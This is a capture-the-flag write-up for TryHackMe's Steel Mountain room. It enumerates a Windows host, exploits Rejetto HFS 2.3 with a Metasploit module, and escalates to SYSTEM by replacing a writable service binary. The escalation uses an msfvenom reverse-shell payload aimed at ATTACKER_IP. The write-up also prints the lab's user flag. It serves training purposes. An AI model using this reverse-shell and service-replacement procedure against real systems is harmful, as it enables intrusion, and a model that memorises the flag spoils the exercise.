# TryHackMe - Steel Mountain Writeup

> **Platform:** TryHackMe
> **Challenge:** Steel Mountain
> **Category:** Windows | HFS Exploitation | Meterpreter | Windows Privilege Escalation

---

# Overview

Today we are solving another **Windows-based** challenge from **TryHackMe** named **Steel Mountain**.

This room focuses on attacking a vulnerable **Rejetto HttpFileServer (HFS)** instance to obtain an initial foothold before escalating privileges to **NT AUTHORITY\SYSTEM** by abusing insecure Windows service permissions. Along the way we perform Windows enumeration, identify publicly known software vulnerabilities, and use PowerUp to discover privilege escalation vectors.

The machine is an excellent introduction to Windows exploitation and post-exploitation methodology.

---

# Target Information

| Information      | Value                  |
| ---------------- | ---------------------- |
| Machine Name     | Steel Mountain         |
| Platform         | TryHackMe              |
| Difficulty       | Easy                   |
| Operating System | Windows Server 2012 R2 |
| Target IP        | **10.49.187.45**       |

---

# Initial Reconnaissance

As with every penetration test, the first step is identifying the exposed attack surface.

A full TCP scan is performed.

```bash
nmap -p- 10.49.187.45
```

The scan discovers several open ports.

```text
80     HTTP
135    MSRPC
139    NetBIOS
445    SMB
3389   RDP
5985   WinRM
47001  WinRM
49152-49199  RPC
```

The presence of SMB, RDP and WinRM immediately suggests that the machine is running Windows.

However, no credentials are currently available, making the web services the primary attack surface.

---

# Service Enumeration

Next, a service and version detection scan is performed.

```bash
nmap -sC -sV 10.49.187.45
```

Important discoveries include:

| Port | Service       | Version                |
| ---- | ------------- | ---------------------- |
| 80   | Microsoft IIS | 8.5                    |
| 445  | SMB           | Windows Server 2012 R2 |
| 3389 | RDP           | Enabled                |
| 5985 | WinRM         | HTTPAPI 2.0            |

Nmap also identifies the machine hostname.

```text
STEELMOUNTAIN
```

SMB message signing is **enabled but not required**, although anonymous sessions are denied.

---

# SMB Enumeration

Since SMB is exposed, enumeration begins there.

Several SMB enumeration techniques are attempted.

```bash
enum4linux-ng 10.49.187.45
```

The enumeration confirms:

* Windows Server 2012 R2
* Workgroup Member
* NetBIOS Name: STEELMOUNTAIN

However:

* Null Sessions are denied
* Guest Sessions fail
* No anonymous shares are accessible

At this point SMB provides useful environmental information but no initial foothold.

Rather than continuing to brute-force SMB, attention shifts toward the web services.

---

# Web Enumeration

Browsing the IIS website reveals a simple company page.

One interesting detail appears on the homepage.

The **Employee of the Month** section highlights:

```text
Bill Harper
```

Although this does not immediately provide credentials, usernames discovered during enumeration are always worth noting because they frequently become useful later.

---

# Discovering an Additional Web Service

While reviewing the scan results, another HTTP service is identified.

```text
8080/tcp
```

Running a targeted scan confirms:

```bash
nmap -sV -p 8080 10.49.187.45
```

Output:

```text
HttpFileServer 2.3

(HFS)
```

The web interface clearly identifies itself as:

```text
HttpFileServer 2.3
```

Since the exact software version is known, the next logical step is researching publicly available vulnerabilities.

---

# Vulnerability Research

Searching Exploit-DB and Metasploit reveals that **Rejetto HFS 2.3** is vulnerable to remote code execution.

Rather than manually recreating the exploit, the existing Metasploit module is used.

The module:

```text
exploit/windows/http/rejetto_hfs_exec
```

targets this exact version.

---

# Exploiting Rejetto HFS

The exploit module is configured.

```text
use exploit/windows/http/rejetto_hfs_exec
```

Initially, execution fails because the default web server port conflicts with an existing service.

```text
SRVPORT already in use
```

Changing the server port resolves the issue.

```text
set SRVPORT 80
```

Running the exploit again successfully delivers the payload.

Within a few seconds, a Meterpreter session is established.

```text
meterpreter >
```

Initial access has now been achieved.

---

# Post Exploitation

The current directory is inspected.

```text
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

Several files are visible including:

```text
hfs.exe
```

confirming that the vulnerable application is running locally.

---

# Locating the User Flag

Moving into Bill Harper's desktop:

```cmd
cd C:\Users\bill\Desktop
```

reveals:

```text
user.txt
```

Since Windows does not include the Linux `cat` command, the correct command is:

```cmd
type user.txt
```

The flag is displayed.

```text
b04763b6fcf51fcd7c13abc7db4fd365
```

The initial objective has now been completed.

---

# Privilege Escalation Enumeration

Obtaining a Meterpreter shell does not automatically provide administrative privileges.

Instead of manually searching every configuration, automated Windows privilege escalation enumeration is performed.

PowerUp is used.

```powershell
Import-Module .\PowerUp.ps1

Invoke-AllChecks
```

Among the results, one service immediately stands out.

```text
AdvancedSystemCareService9
```

PowerUp reports:

```text
Service runs as:

LocalSystem
```

More importantly:

```text
ModifiableFilePermissions
```

and

```text
CanRestart

True
```

This combination indicates a classic **Insecure Service Permissions** vulnerability.

The service executable can be replaced by the current user while the service itself executes as **LocalSystem**.

---

# Understanding the Vulnerability

Windows services often execute with elevated privileges.

If an unprivileged user can modify the executable associated with one of those services, the attacker can replace the original program with a malicious payload.

When the service starts, Windows executes the attacker's program with the privileges of the service account.

Since this service runs as:

```text
LocalSystem
```

the malicious executable will also execute as **SYSTEM**.

---

# Creating the Payload

A Windows service payload is generated.

```bash
msfvenom \
-p windows/shell_reverse_tcp \
LHOST=ATTACKER_IP \
LPORT=4443 \
-e x86/shikata_ga_nai \
-f exe-service \
-o Advanced.exe
```

This payload is specifically generated in **service executable** format.

---

# Replacing the Service Binary

The original executable is replaced with the malicious payload.

After replacing the binary, the vulnerable service is restarted.

As soon as Windows starts the service, it launches the attacker's executable.

A reverse shell immediately connects back.

The session now runs as:

```text
NT AUTHORITY\SYSTEM
```

The privilege escalation is complete.

---

# Retrieving the Root Flag

Now that SYSTEM privileges have been obtained, the Administrator desktop can be accessed.

Reading the root flag completes the machine.

---

# Attack Flow

```text
Nmap Enumeration
        │
        ▼
Discover IIS Website
        │
        ▼
Enumerate SMB
        │
        ▼
Discover Employee Name
        │
        ▼
Identify Port 8080
        │
        ▼
Fingerprint HttpFileServer 2.3
        │
        ▼
Research Public Exploit
        │
        ▼
Exploit Rejetto HFS
        │
        ▼
Meterpreter Shell
        │
        ▼
Retrieve User Flag
        │
        ▼
Run PowerUp
        │
        ▼
Identify Writable Service Binary
        │
        ▼
Generate Malicious Service Executable
        │
        ▼
Replace Service Binary
        │
        ▼
Restart Service
        │
        ▼
SYSTEM Shell
        │
        ▼
Retrieve Root Flag
```

---

# Vulnerabilities Identified

* Outdated Rejetto HttpFileServer 2.3 vulnerable to Remote Code Execution.
* Public exploit available for the installed HFS version.
* Writable Windows service executable.
* Service executing with **LocalSystem** privileges.
* Weak service permissions allowing binary replacement.

---

# Techniques Used

* Nmap Enumeration
* SMB Enumeration
* Windows Service Fingerprinting
* Vulnerability Research
* Metasploit Exploitation
* Meterpreter Post Exploitation
* Windows Enumeration
* PowerUp Privilege Escalation
* Windows Service Abuse
* MSFVenom Payload Generation

---

# User Flag

```text
b04763b6fcf51fcd7c13abc7db4fd365
```

---

# Root Flag

Successfully obtained after exploiting the writable **AdvancedSystemCareService9** service running as **LocalSystem**. The source text does not include the exact root flag value.

---

# Key Takeaways

Steel Mountain is an excellent introductory Windows machine that demonstrates how publicly known software vulnerabilities can quickly provide an initial foothold when systems are not kept up to date. Exploiting the vulnerable Rejetto HFS service requires very little effort once the application version has been identified, reinforcing the importance of accurate service fingerprinting during enumeration.

The privilege escalation phase highlights a common Windows misconfiguration where service binaries inherit insecure file permissions. Even without administrative privileges, the ability to replace an executable that runs as **LocalSystem** results in complete system compromise. PowerUp significantly simplifies the discovery of these misconfigurations, but understanding *why* they are exploitable is just as important as identifying them.

Overall, this room provides practical experience with Windows enumeration, public exploit usage, Meterpreter post-exploitation, PowerShell privilege escalation techniques, and Windows service abuse, making it an excellent foundation before progressing to more advanced Active Directory environments.
